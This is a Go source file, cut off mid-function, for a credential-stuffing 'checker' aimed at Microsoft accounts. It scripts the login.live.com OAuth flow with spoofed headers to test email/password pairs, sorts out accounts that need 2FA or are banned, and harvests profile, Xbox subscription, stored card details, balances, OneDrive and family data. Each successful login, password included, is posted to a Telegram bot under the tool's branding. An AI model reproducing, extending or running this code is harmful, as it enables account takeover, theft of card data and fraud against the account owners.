package main

import (
	"bufio"
	"bytes"
	"crypto/rand"
	"encoding/json"
	"fmt"
	"io"
	"math"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"runtime"
	"sort"
	"strconv"
	"strings"
	"sync"
	"time"
)

// ── ANSI Colors ────────────────────────────────────────────────────────────────
const (
	cRed  = "\033[91m"
	cGrn  = "\033[92m"
	cYel  = "\033[93m"
	cBlu  = "\033[94m"
	cMag  = "\033[95m"
	cCyn  = "\033[96m"
	cWht  = "\033[97m"
	cBold = "\033[1m"
	cRst  = "\033[0m"
)

// ── Mode Constants ─────────────────────────────────────────────────────────────
const (
	ModeXboxOnly    = 1
	ModeInboxerOnly = 2
	ModeBrute       = 3
	ModeCountry     = 4
	ModeOneDrive    = 5
	ModeAllInOne    = 6
)

// ── Telegram Config ────────────────────────────────────────────────────────────
var (
	tgBotToken string
	tgChatID   string
	tgEnabled  bool
)

func tgSend(msg string) {
	if !tgEnabled || tgBotToken == "" || tgChatID == "" {
		return
	}
	go func() {
		body := url.Values{
			"chat_id":    {tgChatID},
			"text":       {msg},
			"parse_mode": {"HTML"},
		}
		req, _ := http.NewRequest("POST",
			"https://api.telegram.org/bot"+tgBotToken+"/sendMessage",
			strings.NewReader(body.Encode()))
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		cl := &http.Client{Timeout: 10 * time.Second}
		resp, err := cl.Do(req)
		if err == nil {
			resp.Body.Close()
		}
	}()
}

func tgBuildHitMsg(r CheckResult) string {
	flag := ""
	if r.Country != "" {
		cc := strings.ToUpper(strings.TrimSpace(r.Country))
		if len(cc) >= 2 {
			if info, ok := countryMap[cc[:2]]; ok {
				flag = info.flag + " "
			}
		}
	}
	lines := []string{
		"<b>✅ HIT — Hot-Ocean </b>",
		"",
		"<b>📧 Email:</b> <code>" + r.Email + "</code>",
		"<b>🔑 Pass:</b>  <code>" + r.Password + "</code>",
	}
	if r.Name != ""    { lines = append(lines, "<b>👤 Name:</b>    "+r.Name) }
	if r.Country != "" { lines = append(lines, "<b>🌍 Country:</b> "+flag+r.Country) }
	if r.Inbox != "" && r.Inbox != "0" {
		lines = append(lines, "<b>📬 Inbox:</b>   "+r.Inbox+" messages")
	}
	if r.Xbox != nil {
		lines = append(lines, "")
		if r.Xbox.IsFree {
			lines = append(lines, "<b>🎮 Xbox:</b>    FREE")
		} else {
			tag := "🎮"
			if r.Xbox.IsExpired { tag = "💀" }
			lines = append(lines, fmt.Sprintf("<b>%s Xbox:</b>    %s", tag, r.Xbox.PremiumType))
			if r.Xbox.DaysLeft != ""    { lines = append(lines, "<b>⏳ Days:</b>    "+r.Xbox.DaysLeft) }
			if r.Xbox.AutoRenew != ""   { lines = append(lines, "<b>🔄 Auto:</b>    "+r.Xbox.AutoRenew) }
			if r.Xbox.RenewalDate != "" { lines = append(lines, "<b>📅 Renews:</b>  "+r.Xbox.RenewalDate) }
		}
		if r.Xbox.Balance != ""       { lines = append(lines, "<b>💰 Balance:</b> "+r.Xbox.Balance) }
		if r.Xbox.RewardsPoints != "" { lines = append(lines, "<b>⭐ Points:</b>  "+r.Xbox.RewardsPoints) }
	}
	if r.Billing != nil {
		lines = append(lines, "")
		card := r.Billing.CardType + " *" + r.Billing.Last4
		if r.Billing.ExpiryMonth != "" { card += " exp "+r.Billing.ExpiryMonth+"/"+r.Billing.ExpiryYear }
		lines = append(lines, "<b>💳 Card:</b>    "+card)
		if r.Billing.CardHolder != "" { lines = append(lines, "<b>👤 Holder:</b>  "+r.Billing.CardHolder) }
		if r.Billing.Balance != ""    { lines = append(lines, "<b>💰 Bal:</b>     "+r.Billing.Balance) }
	}
	if r.OneDrive != nil {
		lines = append(lines, "")
		lines = append(lines, fmt.Sprintf("<b>☁️ OneDrive:</b> %s / %s (%s)", r.OneDrive.Used, r.OneDrive.Total, r.OneDrive.Pct))
	}

	if r.Family != nil && r.Family.MemberCount > 0 {
		lines = append(lines, "")
		lines = append(lines, fmt.Sprintf("<b>👨‍👩‍👧 Family:</b>   %d members", r.Family.MemberCount))
	}
	lines = append(lines, "", "<i>@UP_OCEAN | @DENXPORTAL</i>")
	return strings.Join(lines, "\n")
}

// ── UUID ───────────────────────────────────────────────────────────────────────
func genUUID() string {
	b := make([]byte, 16)
	rand.Read(b)
	b[6] = (b[6] & 0x0f) | 0x40
	b[8] = (b[8] & 0x3f) | 0x80
	return fmt.Sprintf("%x-%x-%x-%x-%x", b[0:4], b[4:6], b[6:8], b[8:10], b[10:])
}

func intMin(a, b int) int {
	if a < b {
		return a
	}
	return b
}

// ── Data Structs ───────────────────────────────────────────────────────────────

type KeywordResult struct {
	Count   float64
	Subject string
	Preview string
	Sender  string
}

type XboxData struct {
	Gamertag      string
	PremiumType   string
	Subscription  string
	StartDate     string
	RenewalDate   string
	DaysLeft      string
	AutoRenew     string
	EAPlay        bool
	TotalAmount   string
	Currency      string
	IsFree        bool
	IsExpired     bool
	Balance       string
	CardHolder    string
	RewardsPoints string
	Country       string // extracted from payment APIs
}

type OneDriveData struct {
	Used      string // human-readable e.g. "12.4 GB"
	Total     string // e.g. "15.0 GB"
	Remaining string // e.g. "2.6 GB"
	Pct       string // e.g. "82%"
}




type FamilyData struct {
	IsFamilyOrganizer bool
	MemberCount       int
	Members           []string // display names
}

// ── Country → Flag+Name mapping ───────────────────────────────────────────────
var countryMap = map[string]struct{ name, flag string }{
	"AF": {"Afghanistan", "🇦🇫"}, "AX": {"Åland Islands", "🇦🇽"}, "AL": {"Albania", "🇦🇱"},
	"DZ": {"Algeria", "🇩🇿"}, "AS": {"American Samoa", "🇦🇸"}, "AD": {"Andorra", "🇦🇩"},
	"AO": {"Angola", "🇦🇴"}, "AI": {"Anguilla", "🇦🇮"}, "AG": {"Antigua and Barbuda", "🇦🇬"},
	"AR": {"Argentina", "🇦🇷"}, "AM": {"Armenia", "🇦🇲"}, "AW": {"Aruba", "🇦🇼"},
	"AU": {"Australia", "🇦🇺"}, "AT": {"Austria", "🇦🇹"}, "AZ": {"Azerbaijan", "🇦🇿"},
	"BS": {"Bahamas", "🇧🇸"}, "BH": {"Bahrain", "🇧🇭"}, "BD": {"Bangladesh", "🇧🇩"},
	"BB": {"Barbados", "🇧🇧"}, "BY": {"Belarus", "🇧🇾"}, "BE": {"Belgium", "🇧🇪"},
	"BZ": {"Belize", "🇧🇿"}, "BJ": {"Benin", "🇧🇯"}, "BM": {"Bermuda", "🇧🇲"},
	"BT": {"Bhutan", "🇧🇹"}, "BO": {"Bolivia", "🇧🇴"}, "BQ": {"Bonaire", "🇧🇶"},
	"BA": {"Bosnia and Herzegovina", "🇧🇦"}, "BW": {"Botswana", "🇧🇼"}, "BR": {"Brazil", "🇧🇷"},
	"IO": {"British Indian Ocean Territory", "🇮🇴"}, "BN": {"Brunei", "🇧🇳"}, "BG": {"Bulgaria", "🇧🇬"},
	"BF": {"Burkina Faso", "🇧🇫"}, "BI": {"Burundi", "🇧🇮"}, "KH": {"Cambodia", "🇰🇭"},
	"CM": {"Cameroon", "🇨🇲"}, "CA": {"Canada", "🇨🇦"}, "CV": {"Cape Verde", "🇨🇻"},
	"KY": {"Cayman Islands", "🇰🇾"}, "CF": {"Central African Republic", "🇨🇫"}, "TD": {"Chad", "🇹🇩"},
	"CL": {"Chile", "🇨🇱"}, "CN": {"China", "🇨🇳"}, "CX": {"Christmas Island", "🇨🇽"},
	"CC": {"Cocos Islands", "🇨🇨"}, "CO": {"Colombia", "🇨🇴"}, "KM": {"Comoros", "🇰🇲"},
	"CG": {"Congo", "🇨🇬"}, "CD": {"DR Congo", "🇨🇩"}, "CK": {"Cook Islands", "🇨🇰"},
	"CR": {"Costa Rica", "🇨🇷"}, "CI": {"Côte d'Ivoire", "🇨🇮"}, "HR": {"Croatia", "🇭🇷"},
	"CU": {"Cuba", "🇨🇺"}, "CW": {"Curaçao", "🇨🇼"}, "CY": {"Cyprus", "🇨🇾"},
	"CZ": {"Czech Republic", "🇨🇿"}, "DK": {"Denmark", "🇩🇰"}, "DJ": {"Djibouti", "🇩🇯"},
	"DM": {"Dominica", "🇩🇲"}, "DO": {"Dominican Republic", "🇩🇴"}, "EC": {"Ecuador", "🇪🇨"},
	"EG": {"Egypt", "🇪🇬"}, "SV": {"El Salvador", "🇸🇻"}, "GQ": {"Equatorial Guinea", "🇬🇶"},
	"ER": {"Eritrea", "🇪🇷"}, "EE": {"Estonia", "🇪🇪"}, "ET": {"Ethiopia", "🇪🇹"},
	"FK": {"Falkland Islands", "🇫🇰"}, "FO": {"Faroe Islands", "🇫🇴"}, "FJ": {"Fiji", "🇫🇯"},
	"FI": {"Finland", "🇫🇮"}, "FR": {"France", "🇫🇷"}, "GF": {"French Guiana", "🇬🇫"},
	"PF": {"French Polynesia", "🇵🇫"}, "TF": {"French Southern Territories", "🇹🇫"},
	"GA": {"Gabon", "🇬🇦"}, "GM": {"Gambia", "🇬🇲"}, "GE": {"Georgia", "🇬🇪"},
	"DE": {"Germany", "🇩🇪"}, "GH": {"Ghana", "🇬🇭"}, "GI": {"Gibraltar", "🇬🇮"},
	"GR": {"Greece", "🇬🇷"}, "GL": {"Greenland", "🇬🇱"}, "GD": {"Grenada", "🇬🇩"},
	"GP": {"Guadeloupe", "🇬🇵"}, "GU": {"Guam", "🇬🇺"}, "GT": {"Guatemala", "🇬🇹"},
	"GG": {"Guernsey", "🇬🇬"}, "GN": {"Guinea", "🇬🇳"}, "GW": {"Guinea-Bissau", "🇬🇼"},
	"GY": {"Guyana", "🇬🇾"}, "HT": {"Haiti", "🇭🇹"}, "HM": {"Heard Island", "🇭🇲"},
	"VA": {"Holy See", "🇻🇦"}, "HN": {"Honduras", "🇭🇳"}, "HK": {"Hong Kong", "🇭🇰"},
	"HU": {"Hungary", "🇭🇺"}, "IS": {"Iceland", "🇮🇸"}, "IN": {"India", "🇮🇳"},
	"ID": {"Indonesia", "🇮🇩"}, "IR": {"Iran", "🇮🇷"}, "IQ": {"Iraq", "🇮🇶"},
	"IE": {"Ireland", "🇮🇪"}, "IM": {"Isle of Man", "🇮🇲"}, "IL": {"Israel", "🇮🇱"},
	"IT": {"Italy", "🇮🇹"}, "JM": {"Jamaica", "🇯🇲"}, "JP": {"Japan", "🇯🇵"},
	"JE": {"Jersey", "🇯🇪"}, "JO": {"Jordan", "🇯🇴"}, "KZ": {"Kazakhstan", "🇰🇿"},
	"KE": {"Kenya", "🇰🇪"}, "KI": {"Kiribati", "🇰🇮"}, "KP": {"North Korea", "🇰🇵"},
	"KR": {"South Korea", "🇰🇷"}, "KW": {"Kuwait", "🇰🇼"}, "KG": {"Kyrgyzstan", "🇰🇬"},
	"LA": {"Laos", "🇱🇦"}, "LV": {"Latvia", "🇱🇻"}, "LB": {"Lebanon", "🇱🇧"},
	"LS": {"Lesotho", "🇱🇸"}, "LR": {"Liberia", "🇱🇷"}, "LY": {"Libya", "🇱🇾"},
	"LI": {"Liechtenstein", "🇱🇮"}, "LT": {"Lithuania", "🇱🇹"}, "LU": {"Luxembourg", "🇱🇺"},
	"MO": {"Macao", "🇲🇴"}, "MK": {"North Macedonia", "🇲🇰"}, "MG": {"Madagascar", "🇲🇬"},
	"MW": {"Malawi", "🇲🇼"}, "MY": {"Malaysia", "🇲🇾"}, "MV": {"Maldives", "🇲🇻"},
	"ML": {"Mali", "🇲🇱"}, "MT": {"Malta", "🇲🇹"}, "MH": {"Marshall Islands", "🇲🇭"},
	"MQ": {"Martinique", "🇲🇶"}, "MR": {"Mauritania", "🇲🇷"}, "MU": {"Mauritius", "🇲🇺"},
	"YT": {"Mayotte", "🇾🇹"}, "MX": {"Mexico", "🇲🇽"}, "FM": {"Micronesia", "🇫🇲"},
	"MD": {"Moldova", "🇲🇩"}, "MC": {"Monaco", "🇲🇨"}, "MN": {"Mongolia", "🇲🇳"},
	"ME": {"Montenegro", "🇲🇪"}, "MS": {"Montserrat", "🇲🇸"}, "MA": {"Morocco", "🇲🇦"},
	"MZ": {"Mozambique", "🇲🇿"}, "MM": {"Myanmar", "🇲🇲"}, "NA": {"Namibia", "🇳🇦"},
	"NR": {"Nauru", "🇳🇷"}, "NP": {"Nepal", "🇳🇵"}, "NL": {"Netherlands", "🇳🇱"},
	"NC": {"New Caledonia", "🇳🇨"}, "NZ": {"New Zealand", "🇳🇿"}, "NI": {"Nicaragua", "🇳🇮"},
	"NE": {"Niger", "🇳🇪"}, "NG": {"Nigeria", "🇳🇬"}, "NU": {"Niue", "🇳🇺"},
	"NF": {"Norfolk Island", "🇳🇫"}, "MP": {"Northern Mariana Islands", "🇲🇵"}, "NO": {"Norway", "🇳🇴"},
	"OM": {"Oman", "🇴🇲"}, "PK": {"Pakistan", "🇵🇰"}, "PW": {"Palau", "🇵🇼"},
	"PS": {"Palestine", "🇵🇸"}, "PA": {"Panama", "🇵🇦"}, "PG": {"Papua New Guinea", "🇵🇬"},
	"PY": {"Paraguay", "🇵🇾"}, "PE": {"Peru", "🇵🇪"}, "PH": {"Philippines", "🇵🇭"},
	"PN": {"Pitcairn", "🇵🇳"}, "PL": {"Poland", "🇵🇱"}, "PT": {"Portugal", "🇵🇹"},
	"PR": {"Puerto Rico", "🇵🇷"}, "QA": {"Qatar", "🇶🇦"}, "RE": {"Réunion", "🇷🇪"},
	"RO": {"Romania", "🇷🇴"}, "RU": {"Russia", "🇷🇺"}, "RW": {"Rwanda", "🇷🇼"},
	"BL": {"Saint Barthélemy", "🇧🇱"}, "SH": {"Saint Helena", "🇸🇭"}, "KN": {"Saint Kitts and Nevis", "🇰🇳"},
	"LC": {"Saint Lucia", "🇱🇨"}, "MF": {"Saint Martin", "🇲🇫"}, "PM": {"Saint Pierre and Miquelon", "🇵🇲"},
	"VC": {"Saint Vincent and the Grenadines", "🇻🇨"}, "WS": {"Samoa", "🇼🇸"}, "SM": {"San Marino", "🇸🇲"},
	"ST": {"Sao Tome and Principe", "🇸🇹"}, "SA": {"Saudi Arabia", "🇸🇦"}, "SN": {"Senegal", "🇸🇳"},
	"RS": {"Serbia", "🇷🇸"}, "SC": {"Seychelles", "🇸🇨"}, "SL": {"Sierra Leone", "🇸🇱"},
	"SG": {"Singapore", "🇸🇬"}, "SX": {"Sint Maarten", "🇸🇽"}, "SK": {"Slovakia", "🇸🇰"},
	"SI": {"Slovenia", "🇸🇮"}, "SB": {"Solomon Islands", "🇸🇧"}, "SO": {"Somalia", "🇸🇴"},
	"ZA": {"South Africa", "🇿🇦"}, "GS": {"South Georgia", "🇬🇸"}, "SS": {"South Sudan", "🇸🇸"},
	"ES": {"Spain", "🇪🇸"}, "LK": {"Sri Lanka", "🇱🇰"}, "SD": {"Sudan", "🇸🇩"},
	"SR": {"Suriname", "🇸🇷"}, "SJ": {"Svalbard and Jan Mayen", "🇸🇯"}, "SZ": {"Swaziland", "🇸🇿"},
	"SE": {"Sweden", "🇸🇪"}, "CH": {"Switzerland", "🇨🇭"}, "SY": {"Syria", "🇸🇾"},
	"TW": {"Taiwan", "🇹🇼"}, "TJ": {"Tajikistan", "🇹🇯"}, "TZ": {"Tanzania", "🇹🇿"},
	"TH": {"Thailand", "🇹🇭"}, "TL": {"Timor-Leste", "🇹🇱"}, "TG": {"Togo", "🇹🇬"},
	"TK": {"Tokelau", "🇹🇰"}, "TO": {"Tonga", "🇹🇴"}, "TT": {"Trinidad and Tobago", "🇹🇹"},
	"TN": {"Tunisia", "🇹🇳"}, "TR": {"Turkey", "🇹🇷"}, "TM": {"Turkmenistan", "🇹🇲"},
	"TC": {"Turks and Caicos Islands", "🇹🇨"}, "TV": {"Tuvalu", "🇹🇻"}, "UG": {"Uganda", "🇺🇬"},
	"UA": {"Ukraine", "🇺🇦"}, "AE": {"UAE", "🇦🇪"}, "GB": {"United Kingdom", "🇬🇧"},
	"US": {"United States", "🇺🇸"}, "UM": {"US Minor Outlying Islands", "🇺🇲"}, "UY": {"Uruguay", "🇺🇾"},
	"UZ": {"Uzbekistan", "🇺🇿"}, "VU": {"Vanuatu", "🇻🇺"}, "VE": {"Venezuela", "🇻🇪"},
	"VN": {"Vietnam", "🇻🇳"}, "VG": {"British Virgin Islands", "🇻🇬"}, "VI": {"US Virgin Islands", "🇻🇮"},
	"WF": {"Wallis and Futuna", "🇼🇫"}, "EH": {"Western Sahara", "🇪🇭"}, "YE": {"Yemen", "🇾🇪"},
	"ZM": {"Zambia", "🇿🇲"}, "ZW": {"Zimbabwe", "🇿🇼"},
	"UK": {"United Kingdom", "🇬🇧"},
}

func countryFileName(code string) string {
	code = strings.ToUpper(strings.TrimSpace(code))
	if len(code) < 2 {
		return ""
	}
	cc := code[:2]
	if info, ok := countryMap[cc]; ok {
		return info.name + " " + info.flag + ".txt"
	}
	return cc + ".txt"
}

type BillingData struct {
	CardHolder    string
	Last4         string
	CardType      string
	ExpiryMonth   string
	ExpiryYear    string
	Balance       string
	City          string
	Zipcode       string
	RewardsPoints string
	Country       string
}


type CheckResult struct {
	Status   string
	Email    string
	Password string
	Name     string
	Country  string
	Inbox    string
	Keywords map[string]KeywordResult
	Xbox     *XboxData
	Billing  *BillingData
	OneDrive *OneDriveData
	Family   *FamilyData
}

// ── Auth Session ───────────────────────────────────────────────────────────────
type authSession struct {
	refreshToken string
	client      *http.Client
	noRedir     *http.Client
	jar         *cookiejar.Jar
	accessToken string
	cid         string
	email       string
	password    string
}

// ── Checker ────────────────────────────────────────────────────────────────────
type Checker struct {
	UUID     string
	Debug    bool
	Keywords []string
	Mode     int
	Proxy    string
	LogCb    func(string)
	Transport *http.Transport
}

func NewChecker(keywords []string, debug bool, mode int) *Checker {
	return &Checker{UUID: genUUID(), Debug: debug, Keywords: keywords, Mode: mode}
}

func (c *Checker) dbg(msg string) {
	if c.Debug {
		if c.LogCb != nil {
			c.LogCb("[DBG] " + msg)
		} else {
			fmt.Printf("%s[DBG]%s %s\n", cYel, cRst, msg)
		}
	}
}
func (c *Checker) dbgStep(step int, title string) {
	if c.Debug {
		fmt.Printf("\n%s%s── STEP %d: %s ──%s\n", cBold, cCyn, step, title, cRst)
	}
}
func (c *Checker) dbgKV(key, val string) {
	if c.Debug {
		fmt.Printf("  %s%-18s%s %s\n", cYel, key+":", cRst, val)
	}
}
func (c *Checker) dbgOK(msg string) {
	if c.Debug {
		fmt.Printf("  %s✅ %s%s\n", cGrn, msg, cRst)
	}
}
func (c *Checker) dbgFail(msg string) {
	if c.Debug {
		fmt.Printf("  %s❌ %s%s\n", cRed, msg, cRst)
	}
}

// ── STEP: Auth (Microsoft Mobile OAuth) ───────────────────────────────────────
func (c *Checker) doAuth(email, password string) (*authSession, error) {
	jar, _ := cookiejar.New(nil)
	
	var baseTransport *http.Transport
	if c.Transport != nil {
		baseTransport = c.Transport.Clone()
	} else {
		baseTransport = &http.Transport{}
	}

	if c.Proxy != "" {
		if pURL, err := url.Parse(c.Proxy); err == nil {
			baseTransport.Proxy = http.ProxyURL(pURL)
		}
	}
	client := &http.Client{Timeout: 20 * time.Second, Jar: jar, Transport: baseTransport}
	
	noRedirTransport := baseTransport.Clone()
	noRedir := &http.Client{
		Timeout: 20 * time.Second,
		Jar:     jar,
		Transport: noRedirTransport,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	c.dbgStep(1, "IDP CHECK")
	idpURL := fmt.Sprintf("https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress=%s", url.QueryEscape(email))
	req1, _ := http.NewRequest("GET", idpURL, nil)
	req1.Header.Set("User-Agent", "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)")
	resp1, err := client.Do(req1)
	if err != nil { return nil, fmt.Errorf("ERROR") }
	defer resp1.Body.Close()
	b1, _ := io.ReadAll(resp1.Body)
	s1 := string(b1)
	c.dbgKV("IDP HTTP", fmt.Sprintf("%d", resp1.StatusCode))
	if strings.Contains(s1, "Neither") || strings.Contains(s1, "Both") ||
		strings.Contains(s1, "Placeholder") || strings.Contains(s1, "OrgId") ||
		!strings.Contains(s1, "MSAccount") {
		c.dbgFail("IDP: not a personal MSAccount")
		return nil, fmt.Errorf("BAD_CREDS")
	}
	c.dbgOK("IDP: MSAccount confirmed")

	c.dbgStep(2, "OAUTH AUTHORIZE (live.com)")
	authorizeURL := fmt.Sprintf(
		"https://login.live.com/oauth20_authorize.srf?client_id=0000000048170EF2"+
			"&redirect_uri=https%%3A%%2F%%2Flogin.live.com%%2Foauth20_desktop.srf"+
			"&response_type=token"+
			"&scope=service%%3A%%3Aoutlook.office.com%%3A%%3AMBI_SSL"+
			"&display=touch&username=%s",
		url.QueryEscape(email),
	)
	req2, _ := http.NewRequest("GET", authorizeURL, nil)
	req2.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36")
	req2.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
	req2.Header.Set("Accept-Language", "en-US,en;q=0.9")
	resp2, err := client.Do(req2)
	if err != nil { return nil, fmt.Errorf("ERROR") }
	defer resp2.Body.Close()
	b2, _ := io.ReadAll(resp2.Body)
	s2 := string(b2)

	urlMatch  := regexp.MustCompile(`"urlPost":"([^"]+)"`).FindStringSubmatch(s2)
	ppftMatch := regexp.MustCompile(`name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)\\"`).FindStringSubmatch(s2)
	if len(ppftMatch) < 2 {
		ppftMatch = regexp.MustCompile(`sFT\s*=\s*'([^']+)'`).FindStringSubmatch(s2)
	}
	if len(ppftMatch) < 2 {
		ppftMatch = regexp.MustCompile(`name="PPFT"[^>]*value="([^"]+)"`).FindStringSubmatch(s2)
	}
	if len(urlMatch) < 2 || len(ppftMatch) < 2 {
		c.dbgFail(fmt.Sprintf("urlPost or PPFT not found (body=%d)", len(s2)))
		return nil, fmt.Errorf("BAD_CREDS")
	}
	postURL := strings.ReplaceAll(urlMatch[1], `\/`, "/")
	ppft := ppftMatch[1]
	c.dbgOK("urlPost + PPFT extracted")
	c.dbgKV("postURL", postURL[:intMin(60, len(postURL))]+"…")

	c.dbgStep(3, "LOGIN POST")
	loginBody := fmt.Sprintf(
		"ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid="+
			"&PPFT=%s&PPSX=Pa&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0"+
			"&IsFidoSupported=1&isSignupPost=0&isRecoveryAttemptPost=0&i13=1"+
			"&login=%s&loginfmt=%s&type=11&LoginOptions=1"+
			"&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd=%s",
		url.QueryEscape(ppft),
		url.QueryEscape(email), url.QueryEscape(email),
		url.QueryEscape(password),
	)
	req3, _ := http.NewRequest("POST", postURL, strings.NewReader(loginBody))
	req3.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req3.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36")
	req3.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7")
	req3.Header.Set("Accept-Language", "en-US,en;q=0.9")
	req3.Header.Set("Sec-Fetch-Site", "same-origin")
	req3.Header.Set("Sec-Fetch-Mode", "navigate")
	req3.Header.Set("Sec-Fetch-User", "?1")
	req3.Header.Set("Sec-Fetch-Dest", "document")
	req3.Header.Set("Origin", "https://login.live.com")
	req3.Header.Set("Referer", authorizeURL)
	resp3, err := noRedir.Do(req3)
	if err != nil { return nil, fmt.Errorf("ERROR") }
	defer resp3.Body.Close()
	b3, _ := io.ReadAll(resp3.Body)
	s3 := string(b3)
	s3Low := strings.ToLower(s3)
	location := resp3.Header.Get("Location")
	c.dbgKV("Login HTTP", fmt.Sprintf("%d", resp3.StatusCode))
	c.dbgKV("Location", location)

	if strings.Contains(s3Low, "account or password is incorrect") ||
		strings.Contains(s3Low, "that microsoft account doesn") ||
		strings.Contains(s3, "Your account or password is incorrect") {
		c.dbgFail("Bad credentials")
		return nil, fmt.Errorf("BAD_CREDS")
	}
	if strings.Contains(s3Low, "identity/confirm") || strings.Contains(s3Low, "/consent") ||
		strings.Contains(s3, "Email/Confirm") || strings.Contains(s3, "recover?mkt") {
		c.dbgFail("2FA/verification required")
		return nil, fmt.Errorf("2FA")
	}
	if strings.Contains(s3Low, "/abuse?mkt=") || strings.Contains(s3Low, "/cancel?mkt=") {
		c.dbgFail("Account banned")
		return nil, fmt.Errorf("BANNED")
	}
	if strings.Contains(s3, "Sign in to your Microsoft account") && !strings.Contains(location, "oauth20_desktop") {
		c.dbgFail("Sign in page — bad creds")
		return nil, fmt.Errorf("BAD_CREDS")
	}

	// SVB: PARSE "<ADDRESS>" LR "refresh_token=" "&"
	refreshToken := ""
	if m := regexp.MustCompile(`refresh_token=([^&\s]+)`).FindStringSubmatch(location); len(m) > 1 {
		refreshToken, _ = url.QueryUnescape(m[1])
	}

	// SVB: PARSE "<COOKIES(MSPCID)>"
	liveURL, _ := url.Parse("https://login.live.com")
	var mspcid string
	var hasANON, hasWLSSC bool
	for _, ck := range jar.Cookies(liveURL) {
		switch ck.Name {
		case "MSPCID": mspcid = ck.Value
		case "ANON":   hasANON = true
		case "WLSSC":  hasWLSSC = true
		}
	}
	c.dbgKV("Cookies ANON/WLSSC", fmt.Sprintf("%v/%v", hasANON, hasWLSSC))
	c.dbgKV("refresh_token len", fmt.Sprintf("%d", len(refreshToken)))

	if !hasANON && !hasWLSSC && !strings.Contains(location, "oauth20_desktop") {
		c.dbgFail("No success indicators")
		return nil, fmt.Errorf("BAD_CREDS")
	}
	cid := strings.ToUpper(mspcid)
	c.dbgKV("CID", cid)
	c.dbgOK(fmt.Sprintf("refresh_token obtained (%d chars)", len(refreshToken)))

	// STEP 4: token exchange for profile/sub APIs (substrate scope)
	c.dbgStep(4, "TOKEN EXCHANGE")
	var accessToken string
	if refreshToken != "" {
		tbBody := "grant_type=refresh_token&client_id=0000000048170EF2" +
			"&scope=https%3A%2F%2Fsubstrate.office.com%2FUser-Internal.ReadWrite" +
			"&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf" +
			"&refresh_token=" + url.QueryEscape(refreshToken) +
			"&uaid=" + c.UUID
		req4, _ := http.NewRequest("POST", "https://login.live.com/oauth20_token.srf", strings.NewReader(tbBody))
		req4.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		req4.Header.Set("User-Agent", "Outlook-Android/2.0")
		req4.Header.Set("x-ms-sso-Ignore-SSO", "1")
		req4.Header.Set("Host", "login.live.com")
		req4.Header.Set("Connection", "Keep-Alive")
		req4.Header.Set("Accept-Encoding", "gzip")
		resp4, err4 := client.Do(req4)
		if err4 == nil {
			defer resp4.Body.Close()
			b4, _ := io.ReadAll(resp4.Body)
			var tk map[string]interface{}
			json.Unmarshal(b4, &tk)
			accessToken, _ = tk["access_token"].(string)
			c.dbgKV("Token Exchange HTTP", fmt.Sprintf("%d access_token_len=%d", resp4.StatusCode, len(accessToken)))
		}
	}
	if accessToken == "" {
		c.dbgFail("access_token empty")
	} else {
		c.dbgOK(fmt.Sprintf("Access token obtained (%d chars)", len(accessToken)))
	}

	return &authSession{
		client: client, noRedir: noRedir, jar: jar,
		accessToken: accessToken, refreshToken: refreshToken, cid: cid,
		email: email, password: password,
	}, nil
}

// ── STEP: Profile ──────────────────────────────────────────────────────────────
func (c *Checker) fetchProfile(sess *authSession, email string) (name, country string) {
	c.dbgStep(5, "PROFILE FETCH")
	req, _ := http.NewRequest("GET", "https://substrate.office.com/profileb2/v2.0/me/V1Profile", nil)
	req.Header.Set("User-Agent", "Outlook-Android/2.0")
	req.Header.Set("Authorization", "Bearer "+sess.accessToken)
	req.Header.Set("X-AnchorMailbox", "CID:"+sess.cid)

	resp, err := sess.client.Do(req)
	if err != nil || resp.StatusCode != 200 {
		if resp != nil {
			c.dbgFail(fmt.Sprintf("Profile API: HTTP %d", resp.StatusCode))
		} else {
			c.dbgFail("Profile API: request error")
		}
		return "", ""
	}
	defer resp.Body.Close()

	var data map[string]interface{}
	json.NewDecoder(resp.Body).Decode(&data)

	// Also check accounts[] array (like a.go parseCountryFromJSON)
	if accounts, ok := data["accounts"].([]interface{}); ok {
		for _, acc := range accounts {
			if accMap, ok := acc.(map[string]interface{}); ok {
				if loc, exists := accMap["location"]; exists && loc != nil {
					country = strings.TrimSpace(fmt.Sprintf("%v", loc))
				}
			}
		}
	}

	for _, k := range []string{"displayName", "name", "givenName"} {
		if v, ok := data[k].(string); ok && v != "" {
			name = v
			break
		}
	}
	if loc, ok := data["location"]; ok && loc != nil {
		switch l := loc.(type) {
		case string:
			parts := strings.Split(l, ",")
			country = strings.TrimSpace(parts[len(parts)-1])
		case map[string]interface{}:
			for _, k := range []string{"country", "countryOrRegion", "countryCode"} {
				if v, e := l[k]; e && v != nil && v != "" {
					country = fmt.Sprintf("%v", v)
					break
				}
			}
		}
	}
	if country == "" {
		for _, k := range []string{"country", "countryOrRegion", "countryCode"} {
			if v, ok := data[k].(string); ok && v != "" {
				country = v
				break
			}
		}
	}
	c.dbgKV("Profile Name", name)
	c.dbgKV("Profile Country", country)
	return name, country
}

// ── STEP: Country Fallback (Graph API) ────────────────────────────────────────
func (c *Checker) fetchCountryFromGraph(sess *authSession) string {
	// Try multiple endpoints to find country
	endpoints := []struct{ url, pat string }{
		{
			"https://graph.microsoft.com/v1.0/me?$select=country,usageLocation,officeLocation",
